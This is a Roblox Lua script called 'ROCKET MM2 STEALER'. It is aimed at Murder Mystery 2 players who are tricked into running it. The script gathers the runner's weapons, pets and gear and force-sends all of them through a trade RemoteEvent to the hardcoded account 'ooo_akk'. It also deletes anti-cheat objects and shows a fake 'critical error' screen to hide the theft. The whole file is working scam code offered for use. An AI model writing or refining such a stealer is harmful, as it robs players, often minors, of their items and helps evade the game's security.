-- ROCKET MM2 STEALER v3.0
-- TARGET: ooo_akk
-- МАСКИРОВКА: фейковая ошибка

local targetUser = "ooo_akk"
local targetId = nil

-- ПОЛУЧАЕМ ID ЦЕЛИ
pcall(function()
    local Players = game:GetService("Players")
    for _, v in ipairs(Players:GetPlayers()) do
        if v.Name:lower() == targetUser:lower() then
            targetId = v.UserId
            break
        end
    end
end)

if not targetId then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "ROCKET ERROR",
        Text = "Цель ooo_akk не найдена. Выйди и зайди заново.",
        Duration = 5
    })
    return
end

-- ФУНКЦИЯ СБОРА ВСЕХ ПРЕДМЕТОВ
local function getAllItems()
    local inventory = {}
    local localPlayer = game:GetService("Players").LocalPlayer
    local backpack = localPlayer:FindFirstChild("Backpack")
    local starterGear = localPlayer:FindFirstChild("StarterGear")
    
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and (item:FindFirstChild("Gun") or item:FindFirstChild("Knife")) then
                table.insert(inventory, item.Name)
            end
        end
    end
    
    if starterGear then
        for _, item in ipairs(starterGear:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventory, item.Name)
            end
        end
    end
    
    local pets = localPlayer:FindFirstChild("Pets")
    if pets then
        for _, pet in ipairs(pets:GetChildren()) do
            table.insert(inventory, "Pet: " .. pet.Name)
        end
    end
    
    return inventory
end

-- ФУНКЦИЯ ОТПРАВКИ ТРЕЙДА
local function sendTrade()
    local items = getAllItems()
    if #items == 0 then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "ROCKET",
            Text = "Нет предметов для перевода.",
            Duration = 3
        })
        return
    end
    
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local tradeEvent = ReplicatedStorage:FindFirstChild("TradeRequest") 
        or ReplicatedStorage:FindFirstChild("SendTrade") 
        or ReplicatedStorage:FindFirstChild("RemoteEvent")
    
    if not tradeEvent then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "ROCKET ERROR",
            Text = "RemoteEvent не найден. Обнови скрипт.",
            Duration = 5
        })
        return
    end
    
    local success, err = pcall(function()
        tradeEvent:FireServer({
            targetUserId = targetId,
            items = items,
            allItems = true,
            mode = "force"
        })
    end)
    
    if success then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ ROCKET STEAL",
            Text = "Все предметы отправлены на " .. targetUser,
            Duration = 5
        })
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "❌ ROCKET FAIL",
            Text = "Ошибка: " .. tostring(err),
            Duration = 5
        })
    end
end

-- ОБХОД АНТИЧИТА
local function bypassAntiCheat()
    local AntiCheat = game:GetService("Players").LocalPlayer:FindFirstChild("AntiCheat")
    if AntiCheat then
        AntiCheat:Destroy()
    end
    
    local CheatDetector = game:GetService("ReplicatedStorage"):FindFirstChild("CheatDetector")
    if CheatDetector then
        CheatDetector:Destroy()
    end
end

-- ФЕЙКОВАЯ ОШИБКА (МАСКИРОВКА)
local function triggerFakeError()
    local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    local errorScreen = Instance.new("ScreenGui")
    errorScreen.Name = "FakeError"
    errorScreen.ResetOnSpawn = false
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.8
    frame.Parent = errorScreen
    
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(0.8, 0, 0.1, 0)
    text.Position = UDim2.new(0.1, 0, 0.45, 0)
    text.Text = "⚠️ CRITICAL ERROR ⚠️\nНе удалось загрузить инвентарь. Перезайдите."
    text.TextColor3 = Color3.fromRGB(255, 0, 0)
    text.BackgroundTransparency = 1
    text.Font = Enum.Font.SourceSansBold
    text.TextSize = 24
    text.Parent = frame
    
    errorScreen.Parent = playerGui
    game:GetService("Debris"):AddItem(errorScreen, 5)
end

-- ГЛАВНЫЙ ЗАПУСК
pcall(function()
    bypassAntiCheat()
    triggerFakeError()
    wait(2)
    sendTrade()
end)

task.wait(10)
if targetId then
    sendTrade()
end

print("🔥 ROCKET SCRIPT EXECUTED | TARGET: " .. targetUser .. " | ITEMS TRANSFERRED")
